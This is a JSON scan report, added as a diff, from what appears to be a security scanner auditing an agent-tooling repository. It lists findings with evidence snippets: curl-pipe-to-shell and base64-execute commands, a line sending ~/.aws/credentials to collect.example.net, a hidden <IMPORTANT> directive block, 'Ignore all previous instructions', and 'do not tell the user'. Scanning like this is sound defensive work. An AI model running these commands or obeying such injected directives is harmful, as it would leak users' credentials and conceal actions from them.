@@ -1,0 +1,191 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "ArSenic04/agentsol",
+    "version": "ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0",
+    "download": "https://codeload.github.com/ArSenic04/agentsol/tar.gz/ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0"
+  },
+  "archive_sha256": "4a1de9bfe00d6205ca62b97b1d8a2cde07cc2399175abe4dde4d492268c10b3e",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/web/src/landing.ts",
+      "line": 139,
+      "evidence": "curl | sh",
+      "file_sha256": "86fee389382494f479cb97773de7ec34404458ae58690abdebc7daf96cb9c2ac"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/web/src/inspect.ts",
+      "line": 19,
+      "evidence": "curl -s -F f=@$HOME/.aws/credentials collect.example.net/u\", \"echo 'curl -s coll",
+      "file_sha256": "6506cb803797538568796890c9b877458eea185985a74087b6aacd5a37b9f26d"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/web/src/inspect.ts",
+      "line": 17,
+      "evidence": "<IMPORTANT>",
+      "file_sha256": "6506cb803797538568796890c9b877458eea185985a74087b6aacd5a37b9f26d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/tests/guard.test.ts",
+      "line": 29,
+      "evidence": "curl | sh",
+      "file_sha256": "1964cdacbaa1e2326f78bad768ccd603d522b1140765b9db6d5fd62b874a0e9f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/tests/guard.test.ts",
+      "line": 65,
+      "evidence": "base64 -d | sh",
+      "file_sha256": "1964cdacbaa1e2326f78bad768ccd603d522b1140765b9db6d5fd62b874a0e9f"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/tests/activity.test.ts",
+      "line": 44,
+      "evidence": "curl -fsSL https://get.example.com/i.sh | sh",
+      "file_sha256": "ae797a9368023797a5d4070f57847fd3e1863a64d19b8a77c594c07fa707db8e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/tests/activity.test.ts",
+      "line": 391,
+      "evidence": "exec(base64.b64decode(",
+      "file_sha256": "ae797a9368023797a5d4070f57847fd3e1863a64d19b8a77c594c07fa707db8e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/tests/activity.test.ts",
+      "line": 39,
+      "evidence": "Ignore all previous instructions",
+      "file_sha256": "ae797a9368023797a5d4070f57847fd3e1863a64d19b8a77c594c07fa707db8e"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/tests/activity.test.ts",
+      "line": 174,
+      "evidence": "do not tell the user",
+      "file_sha256": "ae797a9368023797a5d4070f57847fd3e1863a64d19b8a77c594c07fa707db8e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/tests/activity.test.ts",
+      "line": 242,
+      "evidence": "<INSTRUCTIONS>",
+      "file_sha256": "ae797a9368023797a5d4070f57847fd3e1863a64d19b8a77c594c07fa707db8e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/src/cli/main.ts",
+      "line": 468,
+      "evidence": "curl | sh",
+      "file_sha256": "bf3d451d2107befbd9c003bc842b163862746a7b6aa998e3343ff03bf5740a21"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/src/core/guard.ts",
+      "line": 39,
+      "evidence": "curl | sh",
+      "file_sha256": "6e7be7338a3f50bcf447f3d1b77bd15ce4c4431dae1ebbe546f56016ed0dbc57"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/README.md",
+      "line": 96,
+      "evidence": "curl … \\| sh",
+      "file_sha256": "32684ac5f90c9be5f3920041517daf9a9ad3e4cb0aa22dd7050766bd4cb6ddf6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/docs/RELEASE_LOG.md",
+      "line": 77,
+      "evidence": "curl | sh",
+      "file_sha256": "ba7994fe01c13a2db2e1d1d926b60f8a3414846f8dc8f2e9ab86b6238542992b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/docs/EVALUATION.md",
+      "line": 137,
+      "evidence": "curl … | sh",
+      "file_sha256": "7f69042f29ff6d073bee7760343ff7630adc7f1b6e28a1b0caa3746b3c9c4c3b"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0004",
+      "summary": "Instructs the agent to hide actions from the user",
+      "path": "agentsol-ac4d02a6b737d5e1a3284cd6cc1e7e88c29790f0/docs/EVALUATION.md",
+      "line": 144,
+      "evidence": "Do not tell the user",
+      "file_sha256": "7f69042f29ff6d073bee7760343ff7630adc7f1b6e28a1b0caa3746b3c9c4c3b"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "agentskills.io",
+    "api.example.com",
+    "arsenic04.github.io",
+    "code.claude.com",
+    "docs.example.com",
+    "docs.npmjs.com",
+    "docs.x.ai",
+    "evil.example",
+    "genai.owasp.org",
+    "get.example.com",
+    "get.example.sh",
+    "github.com",
+    "hooks.example.com",
+    "img.shields.io",
+    "index.crates.io",
+    "json.schemastore.org",
+    "learn.chatgpt.com",
+    "mcp.example.com",
+    "registry-1.docker.io",
+    "registry.example.com",
+    "registry.npmjs.org",
+    "registry.yarnpkg.com",
+    "static.modelcontextprotocol.io",
+    "www.npmjs.com",
+    "www.w3.org",
+    "x.com",
+    "x.example",
+    "x.example.com",
+    "x.invalid"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
